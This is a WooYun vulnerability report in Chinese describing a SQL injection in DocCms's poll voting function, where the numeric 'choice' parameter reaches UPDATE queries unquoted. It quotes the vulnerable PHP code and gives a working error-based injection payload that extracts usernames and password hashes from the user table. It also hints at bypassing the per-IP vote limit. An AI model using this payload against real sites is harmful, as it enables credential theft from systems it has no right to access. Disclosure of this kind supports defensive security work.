{"id": 49601, "wybug_id": "wooyun-2014-080762", "wybug_title": "DocCms最新版UPDATE注入一枚", "wybug_corp": "DocCms", "wybug_author": "路人甲", "wybug_date": "2014-10-28 10:41", "wybug_open_date": "2015-01-26 10:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： DocCms最新版UPDATE注入一枚 详细说明：  这次这个漏洞不是因为编码问题造成的了，而是过滤不够完善。Doccms中首先对输入进行了全局过滤Doccms在/loader/doc.php对输入的内容进行了全局的过滤，如下\n$_REQUEST = cleanArrayForMysql($_REQUEST);$_GET     = cleanArrayForMysql($_GET);$_POST    = cleanArrayForMysql($_POST);$request  = $_REQUEST;\n跟进cleanArrayForMysql看一下，/inc/function.php\nfunction cleanArrayForMysql($data){\tif(!get_magic_quotes_gpc())\t\treturn (is_array($data))?array_map('cleanArrayForMysql', $data):mysql_real_escape_string($data);\telse\t\treturn $data;}\n可以看到对用户的输入调用了mysql_real_escape_string()进行过滤，这个函数把sql的几个特殊字符过滤掉了，特别是’。先来看看对’是如何处理的，如下图：\n\n可以看到DocCms把'转换成了/'。那如果想注入的话，不用’就可以了。比如本次注入的地方，在 在线留言-->社会调查-->投票，这里会调用/content/poll/index.php中的send()方法，看看这个方法都做了些什么。\nfunction send(){\tglobal $db;\tglobal $request;\tglobal $params;\tglobal $tag;\t// 标签数组\tif(!empty($request['choice']))\t{\t\t$sql=\"SELECT * FROM \".TB_PREFIX.\"poll_category WHERE id=\".$params['args'];\t\t$poll_client=$db->get_row($sql);\t\t$cur_ip=getip();\t\tif(empty($poll_client->client_ip))\t\t{\t\t\t$insert_ip=$cur_ip;\t\t}\t\telse\t\t{\t\t\t$checkIP=explode(';',$poll_client->client_ip);\t\t\tif(in_array($cur_ip,$checkIP))\t\t\t{\t\t\t\techo \"<script language='javascript'>alert('您已经投过票了！');window.history.go(-1);</script>\";\t\t\t\texit;\t\t\t}\t\t\tarray_push($checkIP,$cur_ip);\t\t\t$insert_ip=implode(';',$checkIP);\t\t}\t\tif ($poll_client->choice=='a')\t\t{\t\t\t\t$db->query(\"UPDATE \".TB_PREFIX.\"poll SET num=num+1 WHERE id=\".$request['choice']);\t\t\t\t\t\t$db->query(\"UPDATE \".TB_PREFIX.\"poll_category SET client_ip='\".$insert_ip.\"' WHERE id=\".$params['args']);\t\t\t\t\t\techo '<script>alert(\"投票成功！\");window.location.href=\"'.sys_href($params['id'],'poll',$params['args']).'\";</script>';\t\t}\t\telseif ($poll_client->choice=='b')\t\t{\t\t\tfor ($i=0;$i<count($request['choice']);$i++)\t\t\t{\t\t\t $db->query(\"UPDATE \".TB_PREFIX.\"poll SET num=num+1 WHERE id=\".$request['choice'][$i]);\t\t\t}\t\t\t$db->query(\"UPDATE \".TB_PREFIX.\"poll_category SET client_ip='\".$insert_ip.\"' WHERE id=\".$params['args']);\t\t\t\t\t\techo '<script>alert(\"投票成功！\");window.location.href=\"'.sys_href($params['id'],'poll',$params['args']).'\";</script>';\t\t}\t}\telse if(empty($request['choice']))\t{\t\techo \"<script language='javascript'>alert('您没有添加选项！');window.history.go(-1);</script>\";\t\texit;\t}}\n可以看到对$request['choice']并没有再次过滤就带入了sql执行，因此，只要构造不含有’的注入语句就可以了。这个地方$request['choice']作为id执行update，而id是数字型的，不存在闭合’的问题，因此构造不含’的注入语句就比较容易了。投票这里存在error-based blind注入，exp如下：\nand  (select 1 from (select count(*),concat(0x23,(select concat(username,0x23,pwd)from doc_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)\n\n\n从上面send()方法中可以看到，对投票者的ip进行了限制，第个ip只能投一票，相信你有N+1种方法可以避开这个限制~   漏洞证明：  见 详细说明   修复方案：  过滤，只对'过滤往往还会造成注入，可以增加对sql关键词的过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}